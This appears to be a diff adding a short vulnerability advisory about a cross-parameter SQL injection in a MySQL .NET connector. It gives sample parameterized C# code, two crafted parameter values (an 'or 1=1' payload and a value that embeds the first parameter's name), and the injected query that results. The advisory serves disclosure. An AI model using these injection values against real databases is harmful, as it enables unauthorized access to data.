@@ -1,0 +1,27 @@
+There is an example for illustrating the attack against the vulnerability:
+----------------------------------------------------------------------
+DataTable dt = new DataTable();
+MySQLConnection conn = new MySQLConnection(CONN_STRING);
+MySQLDataAdapter Cmd = new MySQLDataAdapter();
+string sCmdText = "SELECT * FROM filelist where FILENAME=@sFileName AND LANGUAGE=@sLanguage";
+Cmd.SelectCommand = new MySQLCommand(sCmdText, conn);
+Cmd.SelectCommand.Connection.Open();
+Cmd.SelectCommand.Parameters.Add(new MySQLParameter("@sFileName", SqlDbType.VarChar));
+Cmd.SelectCommand.Parameters["@sFileName"].Value = sFileName;
+Cmd.SelectCommand.Parameters.Add(new MySQLParameter("@sLanguage", SqlDbType.VarChar));
+Cmd.SelectCommand.Parameters["@sLanguage"].Value = sLanguage;
+Cmd.Fill(dt);
+Cmd.SelectCommand.Connection.Close();
+----------------------------------------------------------------------
+
+Assigning (one parameter is assigned with SQL injection attack vector, while another one is assigned with a string which contains the parameter name of the first.):
+----------------------------------------------------------------------
+@sFileName: " or 1=1 -- -"
+@sLanguage: "cn@sFileName"
+----------------------------------------------------------------------
+
+Then, the final sql query statement executed by Mysql is as following:
+----------------------------------------------------------------------
+SELECT * FROM filelist where FILENAME=' or 1=1 -- -' AND LANGUAGE='cn' or 1=1 -- -''
+----------------------------------------------------------------------
+Of course, we should use two parameters to launch a cross-parameter SQL injection attack.
